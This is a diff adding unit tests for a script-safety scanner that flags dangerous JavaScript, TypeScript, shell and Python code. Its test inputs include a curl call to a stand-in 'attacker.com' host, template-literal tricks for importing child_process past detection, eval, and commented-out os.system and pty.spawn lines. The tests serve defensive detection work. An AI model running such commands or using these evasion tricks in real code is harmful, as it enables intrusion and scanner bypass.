@@ -49,7 +49,7 @@ describe("Script Behavioral Scanner", () => {
     });
 
     it("should fail JS scripts importing forbidden modules via static ES import", () => {
-      const code = "import * as cp from 'child_process';";
+      const code = "import * as cp from 'child_process'; console.log(cp);";
       const result = scanScriptSafety("script.js", code);
       expect(result.valid).toBe(false);
       expect(result.errors.some(e => e.message.includes("child_process"))).toBe(true);
@@ -128,6 +128,86 @@ describe("Script Behavioral Scanner", () => {
     it("should pass safe shell code", () => {
       const code = "#!/bin/sh\necho \"Starting build...\"\nmkdir -p dist\ncp src/index.js dist/index.js";
       const result = scanScriptSafety("script.sh", code);
+      expect(result.valid).toBe(true);
+      expect(result.errors).toHaveLength(0);
+    });
+  });
+
+  describe("Code Quality Reviewer Enhancements", () => {
+    it("should parse TypeScript with actual type annotations successfully and validate it", () => {
+      const tsCode = `
+        interface Config {
+          name: string;
+        }
+        function test<T>(val: T): Config {
+          console.log(val);
+          return { name: "test" };
+        }
+        const malicious = eval("2+2");
+      `;
+      const result = scanScriptSafety("script.ts", tsCode);
+      expect(result.valid).toBe(false);
+      expect(result.errors.some(e => e.message.includes("eval"))).toBe(true);
+    });
+
+    it("should block template literal bypass in require and import", () => {
+      const cjsCode = "const cp = require(`child_process`);";
+      const result1 = scanScriptSafety("script.js", cjsCode);
+      expect(result1.valid).toBe(false);
+      expect(result1.errors.some(e => e.message.includes("child_process"))).toBe(true);
+
+      const esmCode = "const cpPromise = import(`child_process`);";
+      const result2 = scanScriptSafety("script.js", esmCode);
+      expect(result2.valid).toBe(false);
+      expect(result2.errors.some(e => e.message.includes("child_process"))).toBe(true);
+    });
+
+    it("should not flag fetch/eval/Function when used as keys, properties, or parameters", () => {
+      const code = `
+        const obj = { fetch: "value", eval: 123 };
+        obj.fetch = "new value";
+        obj.eval = 456;
+        function myFunc(fetch, Function) {
+          // empty
+        }
+        const { fetch: customFetch } = obj;
+        class A {
+          Function() { return 1; }
+        }
+      `;
+      const result = scanScriptSafety("script.js", code);
+      expect(result.valid).toBe(true);
+      expect(result.errors).toHaveLength(0);
+    });
+
+    it("should support uppercase extensions and extensionless scripts with shebangs", () => {
+      // Uppercase extension
+      const result1 = scanScriptSafety("script.SH", "curl http://attacker.com");
+      expect(result1.valid).toBe(false);
+
+      // Extensionless shell script with shebang
+      const result2 = scanScriptSafety("my-runbook", "#!/bin/bash\ncurl http://attacker.com");
+      expect(result2.valid).toBe(false);
+
+      // Extensionless python script with shebang
+      const result3 = scanScriptSafety("my-python-tool", "#!/usr/bin/env python3\nimport subprocess");
+      expect(result3.valid).toBe(false);
+    });
+
+    it("should not trigger Python heuristic alerts on commented-out code", () => {
+      const code = `
+        # import subprocess
+        # import urllib
+        # import requests
+        # import socket
+        # os.system('id')
+        # os.popen('id')
+        # eval('2+2')
+        # exec('1')
+        # pty.spawn('sh')
+        print("Hello")
+      `;
+      const result = scanScriptSafety("script.py", code);
       expect(result.valid).toBe(true);
       expect(result.errors).toHaveLength(0);
     });
